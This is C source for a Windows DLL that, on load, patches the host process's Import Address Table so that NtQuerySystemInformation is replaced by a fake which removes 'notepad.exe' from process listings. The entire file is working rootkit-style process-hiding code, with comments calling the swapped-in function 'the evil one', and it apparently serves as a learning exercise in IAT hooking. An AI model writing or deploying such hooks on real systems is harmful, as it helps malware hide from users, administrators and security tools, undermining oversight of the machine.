#include <Windows.h>
#include <stdio.h>
#include <winternl.h>


typedef int(__stdcall* FunctionLikeNtQuerySystemInformation) (__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength);

// the original NtQuerySystemInformation function, before IAT hooking.
FunctionLikeNtQuerySystemInformation originalNtQuerySystemInformation;

NTSTATUS __stdcall fake_nt_query_system_information(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength)
{

	PSYSTEM_PROCESS_INFORMATION pCurrentProcess, pNextProcess;
	NTSTATUS retStatus;
	// return from original NtQuerySystemInformation which we will modify to exclude notepad.exe.
	retStatus = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && NT_SUCCESS(retStatus))
	{
		pCurrentProcess = NULL;
		pNextProcess = SystemInformation;

		while (pNextProcess->NextEntryOffset)
		{
			pCurrentProcess = pNextProcess; // our current process is the next one.
			// our next one is the current process's (which was just modified) next process.
			pNextProcess = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrentProcess + pCurrentProcess->NextEntryOffset);

			PWCHAR process_name_str = L"notepad.exe";

			if (wcsncmp(pNextProcess->ImageName.Buffer, process_name_str, pNextProcess->ImageName.Length) == 0)
			{
				if (!pNextProcess->NextEntryOffset)
				{
					pCurrentProcess->NextEntryOffset = 0;
				}
				else
				{
					pCurrentProcess->NextEntryOffset += pNextProcess->NextEntryOffset;
				}
				pNextProcess = pCurrentProcess;
			}
		}
	}
	// __debugbreak();
	return retStatus;
}


LPVOID hook_ntquerysysinfo()
{
	LPVOID imageBase = GetModuleHandleA(NULL); // image base, start of the loaded code (?)
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase; // dos headers
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew); // ntHeaders are in e_lfanew

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; // IAT
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase); // img descriptor

	LPCSTR currentLibraryName = NULL;
	HMODULE loadedLibrary = NULL;
	PIMAGE_IMPORT_BY_NAME functionNameStruct = NULL;


	while (importDescriptor->Name != NULL) // run until library name is not null, meaning we have libraries
	{

		currentLibraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)imageBase; // get name of library
		loadedLibrary = LoadLibraryA(currentLibraryName); // loading the dll library

		if (loadedLibrary)
		{

			//OutputDebugStringA("\ndll name");
			//OutputDebugStringA(currentLibraryName);
			PIMAGE_THUNK_DATA originalFirstThunk = NULL;
			PIMAGE_THUNK_DATA firstThunk = NULL;

			// thunk where the functions are located  (?)
			originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk); // the INT (Names)
			firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk); // the IAT (Addresses)

			while (originalFirstThunk->u1.AddressOfData != NULL) // run until function name is not null, meaning we have functions
			{


				if ((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData & 0x80000000)
				{
					originalFirstThunk++;
					firstThunk++;
					continue;
				}

				functionNameStruct = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData); // name of function struct


				//OutputDebugStringA("\nfunc name");
				//OutputDebugStringA(functionNameStruct->Name);

				// if name is NtQuerySystemInformation, what we need, then switch the Function address of the function in the IAT, to our function.
				if (strcmp(functionNameStruct->Name, "NtQuerySystemInformation") == 0)
				{
					DWORD oldProtect = 0;

					VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect); // change permissions.

					originalNtQuerySystemInformation = (DWORD_PTR)firstThunk->u1.Function;
					firstThunk->u1.Function = (DWORD_PTR)fake_nt_query_system_information; // swap the original function address with the evil one.

					DWORD newProtect = 0;

					VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, oldProtect, &newProtect); // change permissions back.

				}

				// increase to go over the next functions.
				originalFirstThunk++;
				firstThunk++;

			}
		}

		// increase to go over the next dlls.
		importDescriptor++;

	}
}


BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpvReserved)  // reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.

		//printf("I was loaded, initializing hook. \n");
		//OutputDebugStringA("I was loaded, initializing hook");
		hook_ntquerysysinfo();

		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;

	case DLL_PROCESS_DETACH:
		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}